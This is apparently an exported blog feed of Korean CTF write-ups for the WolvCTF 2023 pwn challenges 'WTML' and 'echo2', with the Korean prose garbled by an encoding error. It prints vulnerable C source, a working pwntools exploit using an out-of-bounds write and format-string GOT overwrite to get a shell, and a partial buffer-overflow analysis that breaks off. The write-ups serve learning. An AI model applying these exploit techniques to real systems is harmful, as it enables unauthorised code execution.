ì½”ë“œê°€ ê¸¸ê¸° ë–„ë¬¸ì´ë‹¤. í•˜ì§€ë§Œ ì•žì˜ Simple Blogger ë¬¸ì œë¥¼ í’€ê³ ë‚˜ì„œ ìžì‹ ê°ì´ ìƒê²¨ ë°”ì´ë„ˆë¦¬ë¥¼ ì—´ì–´ë´¤ë‹¤. ë¶„ì„ì„ ì—´ì‹¬ížˆ ì§„í–‰í•œ ê²°ê³¼ ì·¨ì•½ì , í’€ì´ ë°©í–¥ì€ ë‹¤ ì•Œê² ìœ¼ë‚˜ ì´ê±¸ ë‚´ê°€ ì½”ë“œë¡œ ìž‘ì„±í•´ì„œ ìµìŠ¤í•  ìˆ˜ ìžˆì„ê¹Œ..?ëž€ ì˜ë¬¸ì´ ë“¤ì—ˆë‹¤. ê·¸ëž˜ì„œ ë¡¸ì—…ì„ ì •ë§ ì“±! ë´¤ëŠ”ë° ë‚´ê°€ ìƒê°í•œ í’€ì´ ë°©í–¥ê³¼ ë™ì¼í–ˆë‹¤. ì½”ë“œë¡œ ìž‘ì„±í•˜ëŠ”ê±° ì¡°ê¸ˆ ì—°êµ¬í•´ë³´ê³ .. ë¸”ë¡œê·¸ì— ì—…ë¡œë“œí•˜ë„ë¡ ë…¸ë ¥í•˜ê² ë‹¤.</p><h2 id="ëª©í‘œ"><a href="#ëª©í‘œ" class="headerlink" title="ëª©í‘œ"></a>ëª©í‘œ</h2><p>ìš´ë™ ê¾¸ì¤€ížˆ í•˜ê³  ì‹¶ë‹¤.. ^^</p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - WTML (pwn, oob)</title>
      <link href="/230322-wolvctf2023-WTML/"/>
      <url>/230322-wolvctf2023-WTML/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>This cool intermediate service receives WTML bodies and replaces tags. How useful! Is it vulnerable?<br><code>nc wtml.wolvctf.io 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 489 points]</li></ul><p>ì†ŒìŠ¤ì½”ë“œê°€ ì£¼ì–´ì ¸ ìžˆê³  ê¸¸ì´ë„ ì§§ì•„ì„œ í¬ë„ˆë¸” ë¬¸ì œ ì¤‘ì— ê°€ìž¥ ë¨¼ì € ì†ëŒ€ë´¤ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì†ŒìŠ¤ì½”ë“œê°€ ì£¼ì–´ì ¸ ìžˆì–´ì„œ ì†ŒìŠ¤ì½”ë“œìœ„ì£¼ë¡œ ë¶„ì„í–ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE_LEN 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*tag_replacer_func)</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tag_replacer</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> id;</span><br><span class="line">    tag_replacer_func funcs[<span class="number">2</span>];</span><br><span class="line">&#125; __attribute__((packed)) tag_replacer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v2</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[DEBUG] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO implement</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please provide feedback about v2: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> response[<span class="number">0x100</span>];</span><br><span class="line">    fgets(response, <span class="keyword">sizeof</span>(response), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your respones: \&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(response);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\&quot; has been noted!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prompt_tag</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message, <span class="type">char</span> *tag)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(message);</span><br><span class="line">    *tag = (<span class="type">char</span>) getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> || *tag == <span class="string">&#x27;&lt;&#x27;</span> || *tag == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    tag_replacer replacer = &#123;</span><br><span class="line">            .funcs = &#123;replace_tag_v1, replace_tag_v2&#125;,</span><br><span class="line">            .id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> user_message[MESSAGE_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your WTML!&quot;</span>);</span><br><span class="line">    fread(user_message, <span class="keyword">sizeof</span>(<span class="type">char</span>), MESSAGE_LEN, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// Replace tag</span></span><br><span class="line">        <span class="type">char</span> from = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;What tag would you like to replace [q to quit]?&quot;</span>, &amp;from);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from == <span class="string">&#x27;q&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> to = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;With what new tag?&quot;</span>, &amp;to);</span><br><span class="line"></span><br><span class="line">        replacer.funcs[replacer.id](user_message, from, to);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(user_message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì•„ëž˜ ë¶€ë¶„ì„ ìœ ì˜ìžˆê²Œ ì‚´íŽ´ë³´ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replacer.funcs[replacer.id](user_message, from, to);</span><br></pre></td></tr></table></figure><p><code>replacer.id</code>ëŠ” 0ìœ¼ë¡œ ì´ˆê¸°í™”ë˜ì–´ìžˆê³ , ë°”ë¡œ ìž…ë ¥í•  ìˆ˜ ìžˆëŠ” ë¶€ë¶„ì´ ì—†ê¸° ë•Œë¬¸ì— ê²‰ìœ¼ë¡œ ë³´ê¸°ì—” <code>replace_tag_v1</code> í•¨ìˆ˜ë§Œ ê³„ì† ì‹¤í–‰ëœë‹¤. í•˜ì§€ë§Œ <code>replace_tag_v2</code>ì—ì„œ FSBê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— ì € í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œì¼œì•¼í•˜ëŠ”ë° ì € í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ë ¤ë©´ <code>replacer.id</code>ë¥¼ 1ë¡œ ì„¸íŒ…í•´ì•¼í•œë‹¤. í•˜ì§€ë§Œ ì´ê±¸ ì–´ë–»ê²Œ ì„¸íŒ…í•´ì•¼ í• ê¹Œ? <code>main</code> í•¨ìˆ˜ì—ì„œ íë¦„ì„ ë°”ê¿€ ì·¨ì•½ì ì´ ë³´ì´ì§€ ì•ŠëŠ”ë‹¤.</p><p><code>replace_tag_v1</code> í•¨ìˆ˜ëŠ” ë¬´ì¡°ê±´ ì‹¤í–‰ë˜ë‹ˆê¹Œ ì´ í•¨ìˆ˜ì—ì„œ ì·¨ì•½ì ì„ ì°¾ì•„ì„œ <code>replace_tag_v2</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œì¼œ FSBë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ë°©í–¥ìœ¼ë¡œ ìƒê°í•´ì•¼ í•œë‹¤.</p><p><code>replace_tag_v1</code> í•¨ìˆ˜ë§Œ ë–¼ì–´ë†“ê³  ë¶„ì„í•´ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MESSAGE_LEN</code>ì€ 0x20ìœ¼ë¡œ ê³ ì •ë˜ì–´ ìžˆë‹¤. ì°¸ê³ ë¡œ <code>meesage</code>, <code>from</code>, <code>to</code> ëª¨ë‘ ìž…ë ¥ê°’ì´ë‹¤. ì²« ë²ˆì§¸ ë°˜ë³µë¬¸ì—ì„œ <code>start_tag_index</code>ëŠ” <code>&lt;[from]&gt;</code>ì´ ë‚˜ì˜¤ëŠ”, ì¦‰ <code>&lt;</code>ì˜ ì¸ë±ìŠ¤ë¥¼ ì˜ë¯¸í•œë‹¤. ë°˜ë³µë¬¸ì„ ë³¼ ë–„ëŠ” í•­ìƒ ë°˜ë³µë¬¸ ì¡°ê±´ì˜ ì¸ë±ìŠ¤ ë²”ìœ„ê°€ ë°˜ë³µë¬¸ ë‚´ë¶€ì—ì„œ ì‚¬ìš©í•˜ëŠ” ì¸ë±ìŠ¤ ë²”ìœ„ë¥¼ ë„˜ì–´ê°€ì§€ ì•ŠëŠ”ì§€ í•­ìƒ ì£¼ì‹œë¥¼ í•´ì•¼í•œë‹¤.</p><p>ë‘ ë²ˆì§¸ ë°˜ë³µë¬¸ì—ì„œëŠ” <code>start_tag_index+3</code>, ì¦‰ <code>&lt;[from]&gt;</code> ë‹¤ìŒ ì¸ë±ìŠ¤ë¶€í„° ì‚¬ìš©í•œë‹¤. ë¬¸ì œëŠ” ì¸ë±ìŠ¤ê°€ <code>MESSAGE_LEN-1</code> ì¼ ë•Œ <code>message[i+2]</code>ì— ì ‘ê·¼í•œë‹¤. OOBê°€ ë°œìƒí•œë‹¤. ì‚¬ì‹¤ ì´ê±°ë³´ë‹¤ ë” ì¤‘ìš”í•œê±´ <code>message[end_tag_index + 2] = to;</code> ì´ êµ¬ë¬¸ì´ë‹¤. ì ‘ê·¼í•¨ì—ë„ ëª¨ìžë¼ ê°’ì„ ì“°ê³  ìžˆë‹¤! ì •í™•í•œ ë””ë²„ê¹…ì„ í†µí•´ ì € ë¶€ë¶„ì´ <code>replacer.id</code>ë¼ë©´ 1ë¡œ ì„¸íŒ…í•´ì¤„ ìˆ˜ ìžˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>FSBë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìžˆìœ¼ë©´ ìµìŠ¤í”Œë¡œìž‡ì€ ê°„ë‹¨í•˜ë‹¤. <code>pie base</code>ì™€ <code>libc base</code>ë¥¼ êµ¬í•œ ë‹¤ìŒì— <code>printf@got</code>ë¥¼ <code>system</code>ìœ¼ë¡œ ë®ê³  ìž…ë ¥ì„ ì¡°ì ˆí•  ìˆ˜ ìžˆìœ¼ë¯€ë¡œ <code>/bin/sh\x00</code>ë¥¼ ë³´ë‚´ë©´ ëì´ë‹¤!</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;wtml.wolvctf.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;ccccccccccccccccccccccccccc&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;/&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;WTML!\n&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1)</span></span><br><span class="line"><span class="comment"># pie  24 -0x3520</span></span><br><span class="line"><span class="comment"># libc 13 -0x8ee8d</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$p_%24$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x8ee8d</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x3520</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">8</span>, &#123;</span><br><span class="line">    e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;Your respones: \&quot;&quot; =&gt; /bin/sh</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;0ff_by_0ne_@nd_y0ure_d0ne!!11!!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - echo2 (pwn, bof)</title>
      <link href="/230322-wolvctf2023-echo2/"/>
      <url>/230322-wolvctf2023-echo2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>New and improved echo?<br><code>nc echotwo.wolvctf-2023.kctf.cloud 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 489 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì•„ì‰½ê²Œë„ ì´ ë¬¸ì œëŠ” ì†ŒìŠ¤ì½”ë“œê°€ ì—†ë‹¤. IDAë¡œ ì—´ì‹¬ì´ ì—´ì–´ì„œ ë¶„ì„í•´ë´¤ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">echo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+108h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Echo2&quot;</span>);</span><br><span class="line">  v3 = __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, v2, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Echo2: %s\n&quot;</span>, ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìž…ë ¥ê°’ í¬ê¸°ë¥¼ ì§ì ‘ ì¡°ì ˆí•  ìˆ˜ ìžˆë‹¤. ê°€ë¿ížˆ BOFê°€ ë°œìƒí•œë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>pieê°€ ê±¸ë ¤ìžˆëŠ”ë° ì–´ë–»ê²Œ í•¨ìˆ˜ê°€ ì¢…ë£Œë˜ê³  ë‹¤ì‹œ <code>main</code>ì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆì„ê¹Œ? 1.5ë°”ì´íŠ¸ê°€ ì¼ì •í•œë° 0.5ë°”ì´íŠ¸ê°€ 2ì˜€ê¸° ë•Œë¬¸ì— ì•„ëž˜ <code>\x47</code>, <code>\x4b</code>, <code>\x4c</code> ë¥¼ ì°ì–´ê°€ë©° ã…Žã…Ž.. <code>main</code>ìœ¼ë¡œ ì´ë™ì‹œí‚¤ë ¤ê³  ë…¸ë ¥í–ˆë‹¤. stack alignì´ ì•ˆë§žì•„ì„œ <code>\x4c</code>ìœ¼ë¡œ ì´ë™í–ˆë‹¤.</p><img src="/images/230322-wolvctf2023-echo2/Screenshot 2023-03-29 at 17.52.51.png" width=600/><br><p>pieê°€ ê±¸ë ¤ìžˆê¸° ë•Œë¬¸ì— leakì„ í•´ì¤˜ì•¼ í•œë‹¤. <code>pop rdi</code>ê°€ ë°”ì´ë„ˆë¦¬ì— ì—†ê¸° ë•Œë¬¸ì— libcë¥¼ leakí•´ì•¼ í•  ë•Œ ì•½ê°„ ê³ ë¯¼í–ˆëŠ”ë° ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ë•Œ ë ˆì§€ìŠ¤í„°ê°€ ì•„ëž˜ì™€ ê°™ì•˜ê¸° ë•Œë¬¸ì— <code>rdi</code>ë¥¼ ê±´ë“œë¦´ í•„ìš”ê°€ ì—†ì–´ì¡Œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rdi   : 0x007ffdd808f940  â†’  0x007ff4dec620d0  â†’  &lt;funlockfile+0&gt; endbr64</span><br></pre></td></tr></table></figure><p>ë°”ë¡œ <code>printf</code>ë¥¼ ì‹¤í–‰í•´ì£¼ê³  <code>main</code>ìœ¼ë¡œ ëŒë ¤ì¤€ ë‹¤ìŒ libcì˜ <code>pop rdi</code>ë¥¼ ì´ìš©í•˜ì—¬ <code>system(&#39;/bin/sh&#39;)</code>ë¥¼ ì‹¤í–‰í•´ì£¼ë©´ 